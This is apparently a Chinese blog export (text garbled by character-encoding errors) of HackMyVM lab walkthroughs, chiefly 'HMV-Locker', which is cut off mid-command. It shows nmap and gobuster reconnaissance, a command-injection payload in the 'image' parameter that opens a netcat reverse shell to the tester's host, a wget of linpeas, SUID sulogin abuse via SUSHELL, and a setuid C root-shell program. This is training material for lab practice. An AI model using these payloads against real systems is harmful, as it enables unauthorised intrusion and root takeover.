<p>å‘ç°è¿™æ˜¯ä¸€ä¸ªé©¬èµ›å…‹ï¼Œæ‰€ä»¥æœä¸€ä¸‹é©¬èµ›å…‹éšå†™<br><a href="https://github.com/spipm/Depixelization_poc">https://github.com/spipm/Depixelization_poc</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="meta">@bogon</span> <span class="type">Depixelization_poc</span><span class="operator">-</span>main <span class="operator">%</span> python3 depix.py \</span><br><span class="line">    <span class="operator">-</span>p <span class="regexp">/Users/</span>kakeru<span class="regexp">/Downloads/</span>a.png \</span><br><span class="line">    <span class="operator">-</span>s images<span class="regexp">/searchimages/</span>debruinseq_notepad_Windows10_closeAndSpaced.png \</span><br><span class="line">    <span class="operator">-</span>o <span class="regexp">/Users/</span>kakeru<span class="regexp">/Downloads/</span>b.png</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°ä¸€ä¸ªb.png è¿™ä¸ªè™½ç„¶è§£å‡ºæ¥è¿˜æ˜¯çœ‹ä¸å‡ºæ¥ï¼Œä½†æ˜¯å‘ç°è¿™æ˜¯è¿™ä¸ªé¡¹ç›®çš„ç¤ºä¾‹é©¬èµ›å…‹ï¼Œæ‰€ä»¥å¾—åˆ°å¯†ç </p>
<p><code>hellofromtheotherside</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">debian@Newbee:/tmp$ su - root</span><br><span class="line">Password: </span><br><span class="line">root@Newbee:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></div>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul>
<li>phpä¼ªåè®®æŸ¥çœ‹æ–‡ä»¶</li>
<li>å­¦ä¹ jwtæ”»å‡»</li>
<li>ç”¨ss çœ‹æœ‰æ²¡æœ‰å…¶ä»–å¼€æ”¾çš„ç«¯å£æœåŠ¡ï¼Œç„¶åç”¨socatè½¬å‘</li>
<li>pbkdf2çˆ†ç ´è„šæœ¬</li>
<li>é©¬èµ›å…‹éšå†™å­¦ä¹ </li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Locker</title>
    <url>/posts/37260.html</url>
    <content><![CDATA[<p>HMV-Lockeré¶æœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.179.190</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">10</span> <span class="number">15</span>:<span class="number">09</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.190</span> (<span class="number">192.168</span>.<span class="number">179.190</span>)</span><br><span class="line">Host is up (<span class="number">0.0028</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">7</span>E:C0:A5:<span class="number">40</span>:<span class="number">29</span>:<span class="number">72</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.80</span> ms <span class="number">192.168</span>.<span class="number">179.190</span> (<span class="number">192.168</span>.<span class="number">179.190</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.06</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>ç«Ÿç„¶åªå¼€æ”¾äº†ä¸€ä¸ª80ç«¯å£ï¼Œç”¨-p-å‚æ•°ä¹Ÿæ˜¯åªå‘ç°è¿™ä¸€ä¸ªç«¯å£</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.190</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>SUPER LOCKER<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">Use root password to unlock our powers!</span><br><span class="line">aAaaaAAaaAaAAaAAaAAaaaA!</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/locker.php?image=1&quot;</span>&gt;</span>Model 1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æç¤ºå’Œrootæœ‰å…³ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿæ²¡æœ‰sshæœåŠ¡å¯ä»¥çˆ†ç ´ï¼Œå…ˆæ‰«æ‰«ç›®å½•å§</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -u 192.168.179.190 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.179.190</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line"><span class="section">Progress: 207643 / 207644 (100.00%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br></pre></td></tr></table></figure></div>
<p>å»æµè§ˆå™¨é‡Œçœ‹çœ‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªè¶…é“¾æ¥<br><img src="https://pic1.imgdb.cn/item/67a9c019d0e0a243d4fdee85.png"><br>ç‚¹è¿›å»ä¹‹åå‡ºç°ä¸€ä¸ªé”çš„å›¾ç‰‡ï¼Œå¹¶ä¸”urlä¸­å¤šäº†ä¸€ä¸ªimageå‚æ•°ï¼Œä¿®æ”¹è¿™ä¸ªå‚æ•°çš„å€¼ä¼šå‡ºç°ä¸åŒçš„é”çš„å›¾ç‰‡<br>ä½†æ˜¯ç”¨sqlmapå°è¯•å‘ç°ä¸æ˜¯å¯ä»¥sqlæ³¨å…¥çš„ã€‚<br>ç°åœ¨å’Œurlå‚æ•°æœ‰å…³çš„å°±åªæœ‰wfuzzäº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.179.190/locker.php?FUZZ=1 --hw 2</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.179.190/locker.php?FUZZ=1</span><br><span class="line">Total requests: 4734</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                            </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000002172:   200        803 L    805 W      61829 Ch    &quot;image&quot;                                            </span><br><span class="line"></span><br><span class="line">Total time: 84.76008</span><br><span class="line">Processed Requests: 4734</span><br><span class="line">Filtered Requests: 4733</span><br><span class="line">Requests/sec.: 55.85175</span><br></pre></td></tr></table></figure></div>
<p>æœå‡ºæ¥locker.phpè¿™ä¸ªæ–‡ä»¶è¿˜æ˜¯åªæœ‰å‚æ•°imgaeã€‚æ²¡æœ‰è¿›å±•äº†ï¼Œçœ‹wpçŸ¥é“äº†è¿™é‡Œå­˜åœ¨å‘½ä»¤æ³¨å…¥<br>å…·ä½“æ˜¯æ€ä¹ˆå‘ç°çš„å‘¢ï¼Ÿ<br>æˆ‘ä»¬é‡æ–°æ‰«ä¸€ä¸‹ç›®å½•ï¼Œä½†æ˜¯æŒ‡å®šåç¼€æ‰«æï¼Œå‘ç°æœ‰ä¸‰ä¸ªjpgæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -u 192.168.179.190 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,jpg,webp </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.179.190</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              html,php,jpg,webp</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 142]</span><br><span class="line">/1.jpg                (Status: 200) [Size: 45726]</span><br><span class="line">/2.jpg                (Status: 200) [Size: 66605]</span><br><span class="line">/3.jpg                (Status: 200) [Size: 62722]</span><br></pre></td></tr></table></figure></div>
<p>åœ¨bpä¸­å‘ç°ï¼Œå¦‚æœ?imgage&#x3D;1å¯ä»¥è®¿é—®åˆ°ç¬¬ä¸€å¼ å›¾ç‰‡ï¼Œä½†æ˜¯?image&#x3D;1.jpgå´ä¸èƒ½æ˜¾ç¤º<br><img src="https://pic1.imgdb.cn/item/67a9c019d0e0a243d4fdee84.png"><br><img src="https://pic1.imgdb.cn/item/67a9c002d0e0a243d4fdee77.png"><br>æ‰€ä»¥å¾ˆæœ‰å¯èƒ½æ˜¯è‡ªåŠ¨åœ¨åé¢æ‹¼æ¥äº†.jpgï¼Œæ‰€ä»¥å¦‚æœè¾“å…¥äº†.jpgå°±ä¼šå˜æˆ1.jpg.jpgæ— æ³•è®¿é—®<br>ç°åœ¨ç”¨;é—­åˆ,å‘ç°å¯ä»¥æˆåŠŸè®¿é—®äº†<br><img src="https://pic1.imgdb.cn/item/67a9c012d0e0a243d4fdee7e.png"><br>æ—¢ç„¶è¿™é‡Œæ˜¯è¯»å–æ–‡ä»¶çš„ï¼Œé‚£å°±å»çœ‹è¿™ä¸ªlocker.phpçš„å…·ä½“ä»£ç æ˜¯ä»€ä¹ˆæ ·çš„<br>?image&#x3D;locker.php()</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 10 Feb 2025 07:51:35 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>244</span><br><span class="line"></span><br><span class="line"><span class="language-php-template"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:image/jpg;base64,</span></span></span><span class="language-php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="language-php"><span class="language-php-template"><span class="variable">$image</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>];</span></span></span><br><span class="line"><span class="language-php"><span class="language-php-template"><span class="variable">$command</span> = <span class="string">&quot;cat &quot;</span>.<span class="variable">$image</span>.<span class="string">&quot;.jpg | base64&quot;</span>;</span></span></span><br><span class="line"><span class="language-php"><span class="language-php-template"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$command</span>);</span></span></span><br><span class="line"><span class="language-php"><span class="language-php-template"><span class="keyword">print</span><span class="string">&#x27;&lt;img src=&quot;data:image/jpg;base64,&#x27;</span>.<span class="variable">$output</span>.<span class="string">&#x27;&quot;width=&quot;150&quot;height=&quot;150&quot;/&gt;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-php"><span class="language-php-template"><span class="meta">?&gt;</span></span><span class="language-xml"><span class="tag"><span class="string"></span></span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml"><span class="language-php-template">&quot;</span><span class="attr">width</span>=<span class="string">&quot;150&quot;</span><span class="attr">height</span>=<span class="string">&quot;150&quot;</span>/&gt;</span></span></span></span><br></pre></td></tr></table></figure></div>
<p>é€»è¾‘æ˜¯å…ˆè·å–æˆ‘ä»¬imageè¾“å…¥çš„å‚æ•°ï¼Œåœ¨åé¢æ‹¼æ¥.jpgç„¶åæ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨;æŠŠå‰é¢ä¸€ä¸ªcaté—­åˆç„¶åè¾“å…¥æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤æœ€åè¾“å…¥;æˆªæ–­<br><img src="https://pic1.imgdb.cn/item/67a9bffed0e0a243d4fdee74.png"><br>æˆåŠŸï¼<br>æ‰€ä»¥è¾“å…¥åå¼¹shellæŒ‡ä»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/locker.php?image=;nc</span> -e <span class="string">/bin/bash</span> 192.168.179.83 <span class="string">1234;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-routeros">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="language-routeros">â””â”€# nc -lp 1234         </span></span><br><span class="line"><span class="language-routeros">id</span></span><br><span class="line"><span class="language-routeros"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span></span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸæ‹¿åˆ°webshell<br>ç¾åŒ–ä¸‹ç»ˆç«¯ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">www-data@locker:~/html$ ^Z</span><br><span class="line">zsh: suspended  nc -lp 1234</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">cat</span> bbb             </span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">[1]  + continued  nc -lp 1234</span><br><span class="line">                             reset</span><br><span class="line">reset: unknown terminal <span class="built_in">type</span> unknown</span><br><span class="line">Terminal <span class="built_in">type</span>? xterm</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">stty</span> -a                                                    </span><br><span class="line">speed 9600 baud; rows 34; columns 116; line = 0;</span><br><span class="line">intr = ^C; quit = ^\; erase = ^?; <span class="built_in">kill</span> = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q;</span><br><span class="line">stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; <span class="keyword">time</span> = 0;</span><br><span class="line">-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts</span><br><span class="line">-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel -iutf8</span><br><span class="line">opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0</span><br><span class="line">isig icanon iexten <span class="built_in">echo</span> echoe -echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc</span><br><span class="line"></span><br><span class="line">www-data@locker:~/html$ <span class="built_in">stty</span> rows 34 columns 116 </span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@locker</span>:~<span class="regexp">/html$ sudo -l</span></span><br><span class="line"><span class="regexp">bash: sudo: command not found</span></span><br><span class="line"><span class="regexp">www-data@locker:~/html</span><span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/sbin</span><span class="regexp">/sulogin</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chsh</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/su</span></span><br></pre></td></tr></table></figure></div>
<p>sudoæ²¡æœ‰ suidä¹Ÿæ²¡æœ‰ç‰¹æ®Šçš„ã€‚ å…ˆä¸Šä¼ ä¸€ä¸ªè‡ªåŠ¨æ£€æµ‹ææƒçš„è„šæœ¬linpeas.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">â””â”€# python3 -m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> port <span class="number">80</span> (http://<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168.179.190</span> - - <span class="string">[10/Feb/2025 16:01:32]</span> code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168.179.190</span> - - <span class="string">[10/Feb/2025 16:01:32]</span> <span class="string">&quot;<span class="keyword">GET</span> /lineas.sh HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168.179.190</span> - - <span class="string">[10/Feb/2025 16:01:38]</span> <span class="string">&quot;<span class="keyword">GET</span> /linpeas.sh HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">www-data@locker:/tmp$ wget <span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">83</span>/linpeas.sh</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span>:<span class="number">01</span>:<span class="number">38</span>--  http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">83</span>/linpeas.sh</span><br><span class="line">Connecting to <span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">332111</span> (324K) <span class="string">[text/x-sh]</span></span><br><span class="line">Saving to: &#x27;linpeas.sh&#x27;</span><br><span class="line"></span><br><span class="line">linpeas.sh                     <span class="number">0</span>%<span class="string">[                                               ]</span>       <span class="number">0</span>  --.-KB/s              linpeas.sh                   <span class="number">100</span>%<span class="string">[==============================================&gt;]</span> <span class="number">324</span>.33K  --.-KB/s    in <span class="number">0</span>.01s   </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">03</span>:<span class="number">01</span>:<span class="number">38</span> (<span class="number">24</span>.<span class="number">8</span> MB/s) - &#x27;linpeas.sh&#x27; saved <span class="string">[332111/332111]</span></span><br><span class="line"></span><br><span class="line">www-data@locker:/tmp$ chmod +x linpeas.sh </span><br><span class="line">www-data@locker:/tmp$ ./linpeas.sh</span><br></pre></td></tr></table></figure></div>

<p>æ²¡æœ‰æ‰«å‡ºä»€ä¹ˆä¸œè¥¿. å¡ä½äº†<br>åŸæ¥æ˜¯suloginè¿™ä¸ªæœ‰suidä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„<br>æˆ‘ä»¬å¯ä»¥æŒ‡å®šç¯å¢ƒå˜é‡ï¼Œå†³å®šå¯ç”¨ä»€ä¹ˆshell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">ENVIRONMENT VARIABLES</span><br><span class="line">       sulogin looks <span class="keyword">for</span> <span class="keyword">the</span> environment variable SUSHELL <span class="keyword">or</span> sushell <span class="keyword">to</span> determine what shell <span class="keyword">to</span> start.  If <span class="keyword">the</span> environment variable <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">set</span>, <span class="keyword">it</span> will <span class="keyword">try</span> <span class="keyword">to</span> execute root&#x27;s shell <span class="keyword">from</span> /etc/passwd.  If <span class="keyword">that</span> fails,  <span class="keyword">it</span>  will  fall</span><br><span class="line">       <span class="keyword">back</span> <span class="keyword">to</span> /bin/sh.</span><br></pre></td></tr></table></figure></div>
<p>åœ¨è¿™é‡Œï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ç”¨sulogin -e æ˜¯æ²¡æ³•è¿›å…¥shellçš„ï¼Œéœ€è¦å¯†ç <br>ä½†æ˜¯å¦‚æœæŒ‡å®šäº†SUSHELLå°±å¯ä»¥ï¼ˆæ¯”å¦‚è¿™é‡Œæˆ‘è¿›ä¸€ä¸ªshï¼‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">www-data@locker:/etc$ <span class="built_in">export</span> <span class="attribute">SUSHELL</span>=/bin/sh</span><br><span class="line">www-data@locker:/etc$ sulogin -e</span><br><span class="line">Press Enter <span class="keyword">for</span> maintenance</span><br><span class="line">(<span class="keyword">or</span> press Control-D <span class="keyword">to</span> continue): </span><br><span class="line">$ id</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure></div>
<p>é‚£ç°åœ¨å°±å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬æ¥åˆ©ç”¨äº†.åœ¨æœ¬åœ°å†™åˆ©ç”¨è„šæœ¬ç„¶åä¸Šä¼ åˆ°é¶æœº</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="selector-attr">[~/tmp]</span></span><br><span class="line">â””â”€# cat tmp<span class="selector-class">.c</span></span><br><span class="line"><span class="selector-id">#include</span> &lt;stdio<span class="selector-class">.h</span>&gt;</span><br><span class="line"><span class="selector-id">#include</span> &lt;unistd<span class="selector-class">.h</span>&gt;</span><br><span class="line"><span class="selector-id">#include</span> &lt;stdlib<span class="selector-class">.h</span>&gt;</span><br><span class="line">int <span class="selector-tag">main</span>()&#123;</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(&quot;/bin/bash&quot;);</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="selector-attr">[~/tmp]</span></span><br><span class="line">â””â”€# 